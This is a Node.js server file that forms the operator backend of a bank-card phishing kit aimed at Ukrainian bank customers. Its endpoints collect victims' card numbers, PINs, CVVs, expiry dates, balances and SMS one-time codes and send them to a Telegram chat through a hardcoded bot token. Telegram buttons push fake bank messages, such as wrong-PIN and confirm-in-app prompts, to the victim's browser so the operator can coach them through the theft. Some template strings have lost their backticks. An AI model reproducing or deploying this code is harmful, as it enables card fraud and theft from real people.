// server.js
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const http = require('http');

// =======================================================================
// --- НАСТРОЙКИ ---
// =======================================================================
const TELEGRAM_BOT_TOKEN = '8334998185:AAG6osIID7p08ZEaKPHODqi5QIgKctIeW4w';
const CHAT_ID = -4871495058;

// =======================================================================
const app = express();
app.use(express.json());
app.use(cors());

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

// =======================================================================
// WebSocket
// =======================================================================
wss.on('connection', (ws) => {
    console.log('Client connected');

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(Client registered: ${data.sessionId});
            }
        } catch (e) {
            console.error('Error processing message:', e);
        }
    });

    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(Client disconnected: ${sessionId});
            }
        });
    });
});

// =======================================================================
// API: Получение анкеты
// =======================================================================
app.post('/api/submit', (req, res) => {
    const data = req.body;
    const { sessionId } = data;

    let visitCount = 1;
    if (sessions.has(sessionId)) {
        visitCount = sessions.get(sessionId).visitCount + 1;
    }
    sessions.set(sessionId, { ...data, visitCount });

    console.log(Received data for session ${sessionId}, visit #${visitCount});

    // Формируем сообщение
    let message = <b>Новий запис!</b>\n\n;
    message += <b>Назва банку:</b> ${data.bankName}\n;
    message += <b>Номер телефону:</b> <code>${data.phone}</code>\n;
    message += <b>Номер карти:</b> <code>${data.card}</code>\n;

    // Ощадбанк
    if (data.bankName.toLowerCase().includes('oschad')) {
        if (data.pin) {
            message += <b>Пін:</b> <code>${data.pin}</code>\n;
        }
    }
    // Райффайзен
    else if (data.bankName.toLowerCase().includes('raiffeisen')) {
        if (data.expiry) {
            message += <b>Срок дії:</b> <code>${data.expiry}</code>\n;
        }
    }
    // Остальные
    else {
        if (data.expiry) {
            message += <b>Срок дії:</b> <code>${data.expiry}</code>\n;
        }
        if (data.cvv) {
            message += <b>CVV:</b> <code>${data.cvv}</code>\n;
        }
    }

    if (data.balance) {
        message += <b>Поточний баланс:</b> <code>${data.balance}</code>\n;
    }

    const visitText = visitCount === 1 ? 'NEW' : ${visitCount} раз;
    message += <b>Кількість переходів:</b> ${visitText}\n;

    sendToTelegram(message, sessionId);
    res.status(200).json({ message: 'OK' });
});

// =======================================================================
// API: Получение SMS-кода
// =======================================================================
app.post('/api/sms', (req, res) => {
    const { sessionId, code } = req.body;
    const sessionData = sessions.get(sessionId);

    if (sessionData) {
        let message = <b>Отримано SMS!</b>\n\n;
        message += <b>Код:</b> <code>${code}</code>\n;
        message += <b>Номер телефону:</b> <code>${sessionData.phone}</code>\n;
        message += <b>Сесія:</b> <code>${sessionId}</code>\n;

bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(SMS code received for session ${sessionId});
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

// =======================================================================
// Отправка в Telegram с кнопками
// =======================================================================
function sendToTelegram(message, sessionId) {
    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'SMS', callback_data: sms:${sessionId} },
                    { text: 'ДОДАТОК', callback_data: app:${sessionId} }
                ],
                [
                    { text: 'ПІН', callback_data: pin_error:${sessionId} },
                    { text: 'КОД', callback_data: code_error:${sessionId} },
                    { text: 'КОД ✅', callback_data: timer:${sessionId} }
                ],
                [
                    { text: 'Карта', callback_data: card_error:${sessionId} },
                    { text: 'Номер', callback_data: number_error:${sessionId} }
                ],
                [
                    { text: 'OTHER', callback_data: other:${sessionId} }
                ]
            ]
        }
    };

    bot.sendMessage(CHAT_ID, message, options)
        .catch(err => console.error("Telegram send error:", err));
}

// =======================================================================
// Обработка команд из Telegram
// =======================================================================
bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);

    console.log(Received command '${type}' for session ${sessionId});

    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};

        switch (type) {
            case 'sms':
                commandData = { text: "Вам відправлено SMS з кодом..." };
                break;
            case 'app':
                commandData = { text: "Вам надіслано підтвердження у додаток банку..." };
                break;
            case 'other':
                commandData = { text: "Вкажіть картку іншого банку для підтвердження." };
                break;
            case 'pin_error':
                commandData = { text: "Невірний ПІН. Введіть вірний ПІН." };
                break;
            case 'card_error':
                commandData = { text: "Невірний номер картки. Введіть вірно." };
                break;
            case 'number_error':
                commandData = { text: "Номер телефону не фінансовий. Введіть прив'язаний до картки." };
                break;
        }

        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: Команда "${type}" відправлена! });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
});

// =======================================================================
// Запуск сервера
// =======================================================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(Server is running on port ${PORT});
});
